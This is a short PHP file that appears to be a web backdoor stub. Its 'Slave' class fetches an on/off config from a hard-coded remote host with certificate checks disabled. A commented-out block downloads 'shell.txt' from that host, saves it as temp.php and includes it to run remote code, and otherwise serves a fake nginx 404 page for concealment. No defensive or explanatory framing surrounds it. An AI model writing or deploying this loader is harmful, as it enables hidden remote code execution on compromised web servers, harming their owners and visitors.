<?php
define( 'SITE', 'http://se.xzn.ir');
error_reporting(0);

$slave = new Slave;
var_dump($slave->isOn());

/*
if($result == "1") {
    curl_setopt($fp, CURLOPT_URL, $site.'/shell.txt');
    curl_setopt($fp, CURLOPT_RETURNTRANSFER, 1);
    $shell=curl_exec($fp);
    $file=fopen('temp.php', 'w');
    fwrite($file, $shell);
    fclose($file);
    include("temp.php");
} else {
    echo '<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>';
}
*/
class Slave {
    private $config, $item_hash;
    
    public function __construct(){
        //$this->item_hash = md5($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
        $this->item_hash = 'abc';
        $this->config = json_decode(json_encode([
            'global' => ['isOn' => true,],
            'sites'=> [
                'abc' => ['isOn' => true]
            ]
        ]));
        
        $this->config = $this->getConfig();
    }
    
    //requests
    private function getUrl($path){
        $c = curl_init();

        curl_setopt($c, CURLOPT_URL, SITE . '/' . $path);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);

        $result = curl_exec($c);
        curl_close($c);

        return $result;
    }
    
    //filegets
    private function getConfig(){
        return json_decode($this->getUrl('config'));
    }
    
    //config checks
    public function isOn(){
        if($this->config->global->isOn){
            if($this->config->sites->{$this->item_hash}->isOn){
                return true;
            }
        }
        
        return false;
    }
}

